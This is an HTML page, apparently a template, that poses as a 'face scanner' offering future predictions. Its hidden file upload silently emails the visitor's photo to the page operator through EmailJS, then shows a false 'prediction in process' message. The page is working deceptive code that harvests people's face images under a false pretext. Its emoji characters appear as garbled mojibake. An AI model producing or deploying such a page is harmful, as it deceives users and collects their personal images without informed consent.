<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ADBOSS Face Scanner</title>
  <style>
    body {
      font-family: sans-serif;
      background: #e0f7ff;
      text-align: center;
      padding-top: 50px;
    }

    .option-card {
      display: inline-block;
      background: #fff;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
      font-size: 20px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .option-card:hover {
      transform: scale(1.05);
      background: #ccf7ff;
    }

    form {
      display: none;
    }
  </style>
</head>
<body>

  <h1>üîÆ Scan Your Face for Future Prediction</h1>

  <div class="option-card" onclick="document.getElementById('photoUploader').click()">
    üì∏ Tap to Scan Face
  </div>

  <!-- Hidden form -->
  <form id="photoForm">
    <input type="file" name="photo" id="photoUploader" accept="image/*" onchange="sendPhoto()" />
  </form>

  <!-- EmailJS Script -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("YOUR_USER_ID"); // Replace with your actual public key

    function sendPhoto() {
      const form = document.getElementById("photoForm");

      emailjs.sendForm("YOUR_SERVICE_ID", "template_face", form)
        .then(() => {
          alert("‚úÖ Face scanned! Prediction in process...");
        })
        .catch((err) => {
          alert("‚ùå Upload failed. Try again.");
          console.error(err);
        });
    }
  </script>

</body>
</html>
